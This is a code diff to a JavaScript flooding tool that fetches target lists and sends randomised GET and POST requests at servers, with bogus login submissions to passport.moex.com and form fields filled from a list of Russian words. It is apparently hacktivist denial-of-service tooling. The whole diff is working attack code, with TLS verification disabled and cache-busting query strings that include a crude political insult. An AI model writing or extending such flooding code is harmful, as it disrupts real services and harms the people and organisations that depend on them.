@@ -8,6 +8,19 @@ const emailDomains = [
     'mail.ru',
     'yandex.ru',
 ];
+const moskalWords = [
+    'танк',
+    'оружие',
+    'оборона',
+    'структура',
+    'граждани',
+    'безопасность',
+    'Международный договор',
+    'противодействие коррупции',
+    'служба',
+    'паляниця',
+    'нісенітниця',
+];
 
 const total = {};
 const current = {
@@ -76,15 +89,24 @@ async function fetchWithTimeout(resource) {
             const method = resource.method || 'GET';
 
             let body = undefined;
-            let path = `${resource.path}?putin=huilo&biba=${Math.random()}`;
+            let path = resource.noQuery
+              ? resource.path
+              : `${resource.path}?putin=huilo&biba=${Math.random()}`;
 
             if (method === 'POST') {
                 body = new URLSearchParams();
 
-                body.append('return_to', `https://passport.moex.com/?putin=huilo&biba=${Math.random()}`);
-                body.append('user[credentials]', `${Math.random()}@${rand(emailDomains)}`);
-                body.append('user[password]', `${Math.random()}`);
-                body.append('authenticity_token', `${Math.random()}/${Math.random}`);
+                if (resource.formData) {
+                    Object.entries(resource.formData)
+                        .forEach(([key, template]) => {
+                            body.append(key, template.replace('{moskalWord}', rand(moskalWords)));
+                        })
+                } else {
+                    body.append('return_to', `https://passport.moex.com/?putin=huilo&biba=${Math.random()}`);
+                    body.append('user[credentials]', `${Math.random()}@${rand(emailDomains)}`);
+                    body.append('user[password]', `${Math.random()}`);
+                    body.append('authenticity_token', `${Math.random()}/${Math.random}`);
+                }
 
                 path = resource.path;
             }
@@ -96,6 +118,7 @@ async function fetchWithTimeout(resource) {
                 method,
                 signal: controller.signal,
                 rejectUnauthorized: false,
+                headers: resource.headers || {},
             }
 
             const result = {path: `${options.hostname}${options.path}`};
@@ -167,7 +190,9 @@ async function flood(target) {
 
         res.on('end', function() {
             try {
-                const targets = JSON.parse(Buffer.concat(body).toString());
+                const targets = process.env.SOURCE === 'local'
+                    ? require(`./${targetedService}.targets.json`)
+                    : JSON.parse(Buffer.concat(body).toString());
 
                 console.log('DOWNLOADED TARGETS');
 
